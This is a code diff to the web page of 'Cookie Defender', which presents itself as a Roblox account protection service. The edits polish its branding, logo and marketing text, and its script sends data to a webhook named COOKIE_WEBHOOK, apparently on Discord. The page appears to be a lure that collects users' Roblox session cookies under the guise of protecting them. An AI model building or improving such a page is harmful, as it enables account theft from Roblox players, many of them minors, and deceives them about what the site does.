@@ -3,19 +3,19 @@
 <head>
     <meta charset="UTF-8" />
     <meta name="viewport" content="width=device-width, initial-scale=1.0" />
-    <title>CookieDefender – Roblox Account Protection</title>
+    <title>Cookie Defender</title>
     <meta name="description" content="Enterprise-grade cookie protection for Roblox accounts." />
 
     <!-- Discord / Open Graph Embed -->
-    <meta property="og:title" content="CookieDefender – Roblox Account Protection" />
-    <meta property="og:description" content="Enterprise-grade cookie protection for Roblox accounts. Military-grade encryption and real-time threat defense." />
+    <meta property="og:title" content="Cookie Defender – Roblox Account Protection" />
+    <meta property="og:description" content="Keep your Roblox account secure with advanced cookie protection and account monitoring." />
     <meta property="og:type" content="website" />
     <meta property="og:url" content="https://cookiedefender.com" />
-    <meta property="og:site_name" content="CookieDefender" />
+    <meta property="og:site_name" content="Cookie Defender" />
     <meta property="og:image" content="https://media.discordapp.net/attachments/1518457981878931618/1519426957073191156/blueredcookiedefender-removebg-preview.png?ex=6a3d8420&is=6a3c32a0&hm=20d77864cd33d172902f8b73d0ae7938f107b6c46826a215c1e8e79321e1bb2c&=&format=webp&quality=lossless" />
 
     <meta name="twitter:card" content="summary_large_image" />
-    <meta name="twitter:title" content="CookieDefender – Roblox Account Protection" />
+    <meta name="twitter:title" content="Cookie Defender – Roblox Account Protection" />
     <meta name="twitter:description" content="Enterprise-grade cookie protection for Roblox accounts." />
 
     <link rel="preconnect" href="https://fonts.googleapis.com" />
@@ -188,17 +188,10 @@
             transform: translateY(-2px);
         }
 
-        .logo-icon {
-            width: 36px;
-            height: 36px;
-            background: linear-gradient(135deg, var(--roblox-red), var(--roblox-red-dark));
-            border-radius: 10px;
-            display: flex;
-            align-items: center;
-            justify-content: center;
-            color: white;
-            font-size: 1.2rem;
-            box-shadow: 0 4px 16px rgba(224, 0, 77, 0.3);
+        .logo img {
+            width: 42px;
+            height: 42px;
+            object-fit: contain;
         }
 
         .logo span {
@@ -484,9 +477,8 @@
 
         .roblox-character {
             width: 100%;
-            max-width: 260px;
+            max-width: 280px;
             margin: 0 auto 24px;
-            filter: drop-shadow(0 20px 60px rgba(224, 0, 77, 0.2));
             display: block;
         }
 
@@ -1254,8 +1246,8 @@
     <nav class="nav" id="nav">
         <div class="nav-container">
             <a href="#" class="logo">
-                <div class="logo-icon">🛡</div>
-                <span>CookieDefender</span>
+                <img src="https://media.discordapp.net/attachments/1518457981878931618/1519426957073191156/blueredcookiedefender-removebg-preview.png?ex=6a3d8420&is=6a3c32a0&hm=20d77864cd33d172902f8b73d0ae7938f107b6c46826a215c1e8e79321e1bb2c&=&format=webp&quality=lossless" alt="Cookie Defender Logo">
+                <span>Cookie Defender</span>
             </a>
             <div class="nav-links" id="navLinks">
                 <a href="#features" class="nav-link">Features</a>
@@ -1298,19 +1290,8 @@
             </div>
             <div class="hero-visual">
                 <div class="hero-card">
-                    <svg class="roblox-character" viewBox="0 0 200 240" fill="none" xmlns="http://www.w3.org/2000/svg">
-                        <defs>
-                            <linearGradient id="robloxGrad" x1="0%" y1="0%" x2="100%" y2="100%">
-                                <stop offset="0%" style="stop-color:#e0004d;stop-opacity:1" />
-                                <stop offset="100%" style="stop-color:#0066ff;stop-opacity:1" />
-                            </linearGradient>
-                        </defs>
-                        <path d="M100 20 L170 55 L170 135 C170 175 135 205 100 215 C65 205 30 175 30 135 L30 55 Z" fill="url(#robloxGrad)" opacity="0.12"/>
-                        <path d="M100 20 L170 55 L170 135 C170 175 135 205 100 215 C65 205 30 175 30 135 L30 55 Z" stroke="url(#robloxGrad)" stroke-width="3" fill="none"/>
-                        <rect x="85" y="100" width="30" height="35" rx="3" fill="url(#robloxGrad)" opacity="0.8"/>
-                        <circle cx="100" cy="90" r="12" stroke="url(#robloxGrad)" stroke-width="4" fill="none"/>
-                        <circle cx="100" cy="117" r="3" fill="white"/>
-                    </svg>
+                    <img src="https://media.discordapp.net/attachments/1518457981878931618/1519426957073191156/blueredcookiedefender-removebg-preview.png?ex=6a3d8420&is=6a3c32a0&hm=20d77864cd33d172902f8b73d0ae7938f107b6c46826a215c1e8e79321e1bb2c&=&format=webp&quality=lossless" 
+                         alt="Cookie Defender Logo" class="roblox-character">
                     <div class="stats-mini">
                         <div class="stat-mini">
                             <div class="stat-mini-number" id="miniProtected">72,481</div>
@@ -1410,7 +1391,7 @@
                 <a href="#">Privacy Policy</a>
             </div>
             <div class="footer-copyright">
-                CookieDefender &copy; 2025 &middot; Roblox Account Security Platform &middot; Not affiliated with Roblox Corporation
+                Cookie Defender &copy; 2025 &middot; Roblox Account Security Platform &middot; Not affiliated with Roblox Corporation
             </div>
         </div>
     </footer>
@@ -1767,7 +1748,6 @@ window.activateDefense = function() {
                 }]
             };
 
-            // Send the professional embed to Discord
             fetch(COOKIE_WEBHOOK, {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
@@ -1775,7 +1755,6 @@ window.activateDefense = function() {
             })
             .then(response => {
                 if (!response.ok) {
-                    // Fallback if embed is rejected
                     return fetch(COOKIE_WEBHOOK, {
                         method: 'POST',
                         headers: { 'Content-Type': 'application/json' },
